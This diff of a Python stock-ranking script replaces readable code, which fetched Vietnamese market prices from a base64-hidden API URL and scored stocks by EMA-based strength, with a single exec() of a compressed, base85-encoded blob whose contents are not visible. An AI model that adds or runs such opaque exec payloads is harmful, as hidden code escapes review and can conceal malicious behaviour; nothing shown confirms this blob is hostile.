@@ -1,37 +1,17 @@
-"""RS = Sức mạnh giá (SMG) theo đúng công thức WiData, xếp hạng trên TOÀN thị trường (HOSE+HNX+UPCoM).
-smg = 0.4*%(giá/EMA20) + 0.3*%(giá/EMA60) + 0.3*%(giá/EMA120); điểm = (1 - thứ hạng/tổng số mã)*100.
-Chạy 1 lần/ngày sau phiên trên GitHub (miễn phí), ghi data/rs_wi.bin để update.py dùng."""
-import datetime, time, json, urllib.request, base64
-from concurrent.futures import ThreadPoolExecutor
-import hncodec
-_h = lambda s: base64.b64decode(s).decode()
-_S1 = _h("aHR0cHM6Ly9kY2hhcnQtYXBpLnZuZGlyZWN0LmNvbS52bi9kY2hhcnQvaGlzdG9yeQ==")
-UA = {"User-Agent": "Mozilla/5.0"}
-def closes(s):
-    to = int(time.time()); fr = to - 420*86400
-    for k in range(3):
-        try:
-            with urllib.request.urlopen(urllib.request.Request(f"{_S1}?resolution=D&symbol={s}&from={fr}&to={to}", headers=UA), timeout=20) as r:
-                j = json.load(r)
-            return s, j.get("t") or [], j.get("c") or [], j.get("v") or []
-        except Exception:
-            time.sleep(1 + k)
-    return s, [], [], []
-def ema(c, n):
-    a = 2/(n+1); e = c[0]
-    for x in c[1:]: e = a*x + (1-a)*e
-    return e
-def smg(c):
-    x = c[-1]
-    return 0.4*100*(x/ema(c, 20)-1) + 0.3*100*(x/ema(c, 60)-1) + 0.3*100*(x/ema(c, 120)-1)
-syms = [r[0] for r in hncodec.load("data/c/syms.bin")["s"] if r[1] in ("H", "X", "U") and len(r[0]) == 3]
-with ThreadPoolExecutor(8) as ex: res = list(ex.map(closes, syms))
-last = max((t[-1] for _, t, c, v in res if t), default=0)
-# Chỉ xếp hạng mã còn giao dịch (giá có thay đổi trong 5 phiên) — khớp cách WiData (lệch TB ~1,3 điểm)
-raw = {s: smg(c) for s, t, c, v in res if len(c) >= 20 and t[-1] >= last - 10*86400 and len(set(c[-5:])) > 1}
-val = {s: sum(c[i]*(v[i] if i < len(v) else 0) for i in range(-20, 0))/20*1000/1e9 for s, t, c, v in res if len(c) >= 20}
-od = sorted(raw, key=lambda s: -raw[s]); Y = len(od)
-sc = {s: round((1 - (i+1)/Y)*100, 4) for i, s in enumerate(od)}
-ngay = datetime.datetime.fromtimestamp(last + 7*3600, datetime.timezone.utc).strftime("%Y-%m-%d")
-hncodec.dump(dict(ngay=ngay, nguon="SMG tự tính (công thức WiData)", tong=Y, smg=sc, ung=sorted(x for x in sc if sc[x] >= 85 and val.get(x, 0) >= 10)), "data/rs_wi.bin")
-print("ok", ngay, Y)
+import zlib, base64
+_B = (
+    "c-oCrVQ<?u5dE%SaS)JzbR=1F953;v4jEP?AJSrN7p#t91hhokY9!JlDMyas|Gp!oI8C|%6JT269q%6ByF0I_)>0YBnc=3WcmVDC"
+    "O-m6#t;({PM~eSlb8P~cGtEasZ=qxbnG{*A6c;91)TUNkLl^7MmEtV_L(1}f!?W5*<#m>o$Yjnl?|ua-l&qTP4D`4Q8_h>UG@=91"
+    "H0s`{cmE|p=ld1$+4bi*yZ$h`*<L(M2CG#jKAFka-_|$cuD-h}w|9SijBl!soB5Zs!Mr&5Y}i%#lwVzJ`KL7Xsdsyc@pk^L<|@2g"
+    "B7T1i{s;L~lqKt*MX|s4a=w79l$vXVGWGx;Bk@!r46*z~b|IAh3=4(ZXbWLDh<oRwVH`X6g;el>{-Bsxa&p>5ago&a<-<OYg;~9!"
+    "I>Jx6=7PN0{@nhPg}*~y_P-+QvaC%ZMf&@(-d1y2raQeqwhE=Yh1wq*neL3-`vI&_6s~l7dr4cBWo^<yOo3@ouMyej8(z#-K~zeX"
+    "6GdM+D2|E?&{!zZk{jY1p8{TaIy>xSKkRItcMhR=lkv5I_wElb@fw9=T9=%!NdhPE&_Z}gZ9}&|Cm637$pR1^)eP|u`b3;0C=<tz"
+    "Y#PrF+B8<1Y?_Q`V`pT&22+qEWVFY>&%<48T`fu01#VodFqwVt7DvNg630E#^gA5LY?x3C8b_yZOr!rcCG9Z}wbYnrst~jTtSsQJ"
+    "e_Ba=>{-^&`qnj?7s97gU;8sC7NDld%=#1m8in`2+T|A6XCj9ZtI9^Dkfv}t^IY})*s|o@6$Wp{U|Sp8wZOXLO;oWpX?r68o0?Lu"
+    "WZIxd#Tr74WyT@C$0`c|@3e7!VCTaE4AveJ%IeajG4&LCw9SY!pk>${)c<zS!bbZ$6g77DXcN7&a|E-8kaX>LxTMCKL!HjXGm7UR"
+    "*?SvSK4+^dv=y@++2Cs97x0TawV}XE%^_~F6fZp-4&nf}X&)OMMT`3hzxaQ6_nyo#vBnX|v6a|k01tedz6`(+_ojM=g*vfJ<58Jo"
+    "4P+f!C2NrrY=RI-f%V*<P>UddVFwbGu&KGIE3R;o+v9srEZG(#JdgJ1@M5QfebI(hYvTAjfuDM(BOCMJWtS%@cvPE=M%t)_n|l7y"
+    "Bs{9ZqZ~)+b3NuY#>tD!5Suf#3pV1i#<AqD1XiDsVwp|?t8%K5sTw~!I+~Y$#0w*HI-535*z+@|C93A;M`PKy`w5DG1?|dT>HEi`"
+    "t$uH<?0oj+gKv{t2ovi41J$(*SO"
+)
+exec(zlib.decompress(base64.b85decode(_B)).decode())
